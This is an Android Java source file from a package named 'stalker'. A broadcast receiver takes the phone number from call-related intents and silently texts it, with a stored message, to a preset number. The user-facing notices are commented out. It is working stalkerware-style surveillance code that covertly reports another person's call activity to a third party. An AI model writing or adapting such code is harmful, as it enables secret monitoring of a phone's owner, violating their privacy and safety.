package com.example.stalker;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.preference.PreferenceManager;
import android.telephony.SmsManager;
import android.widget.Toast;


public class MyBroadcaster extends BroadcastReceiver {
    private static final String PHONE_NUMBER = "phone_number";
    private static final String MSG_TO_SEND = "message to send";
    @Override
    public void onReceive(Context context, Intent intent) {
        final String action = intent.getAction();
        String phoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
        SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(context);

        sendSMS(sp.getString(PHONE_NUMBER, ""), sp.getString(MSG_TO_SEND, ""), phoneNumber);
    }

    public void sendSMS(String SMSphoneNo, String msg, String CallPhoneNo) {
        if (SMSphoneNo.equals("") || msg.equals(""))
            return;
        String totalMsg = msg + CallPhoneNo;
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(SMSphoneNo, null, totalMsg, null, null);
//            Toast.makeText(getApplicationContext(), "Message Sent",
//                    Toast.LENGTH_LONG).show();
        } catch (Exception ex) {
//            Toast.makeText(getApplicationContext(),ex.getMessage().toString(),
//                    Toast.LENGTH_LONG).show();
            ex.printStackTrace();
        }
    }
}
